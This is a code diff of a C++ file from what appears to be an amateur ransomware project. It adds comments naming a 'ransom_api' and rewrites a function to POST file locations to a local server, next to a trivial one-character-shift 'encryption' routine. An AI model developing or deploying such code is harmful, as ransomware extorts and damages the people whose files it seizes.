@@ -1,5 +1,7 @@
 #include <string>
 #include "HTTPRequest.hpp"
+
+
 //Function to read locations and push them into a vector.
 bool getFileContents(std::string fileName, std::vector<std::string> & fileContents){  
 
@@ -17,12 +19,14 @@ bool getFileContents(std::string fileName, std::vector<std::string> & fileConten
     return true;
 }
 
+
 //Basic function to read all chars and increment them by one. 
 void basicEncryptContent(std::string& content){
 	for(char& chr : content){
 		chr = chr + 1;
 	}
 }
+
 
 //Basic function to read all chars and decrement them by one.
 void basicDecryptContent(std::string& content){
@@ -32,6 +36,7 @@ void basicDecryptContent(std::string& content){
 }
 
 
+//Get request to ransom_api.
 std::string get_request(std::string uri){
       try{
         
@@ -50,13 +55,17 @@ std::string get_request(std::string uri){
     } 
 }
 
-void post_request(std::string uri, std::string param){
+
+//Post Request to ransom_api.
+void post_request(std::string body){
     try
     {
-        http::Request request(uri);
-
-        const std::string body = "{\"file_location\": \"as\"}";
-        const auto response = request.send("POST", parameters, {
+        http::Request request("http://127.0.0.1:5000/locations");  
+        std::string a = "{\"file_location\": \""; //TODO - Make this work and not three strings lol
+        std::string b = body;
+        std::string c = "\"}";      
+        const std::string body = a + b + c;
+        const auto response = request.send("POST", body, {
             "Content-Type: application/json"
         });
         std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
@@ -66,10 +75,6 @@ void post_request(std::string uri, std::string param){
         std::cerr << "Request failed, error: " << e.what() << '\n';
     }
 }
-
-
-
-
 
 
 //Splits string into chunks bassed on char delimiter.
@@ -84,9 +89,6 @@ void tokenize(std::string const &str, const char delim,
         out.push_back(s); 
     } 
 } 
-
-
-
 
 
 // *** Will replace with some kind of library. This is a hacky mess. REPLACE
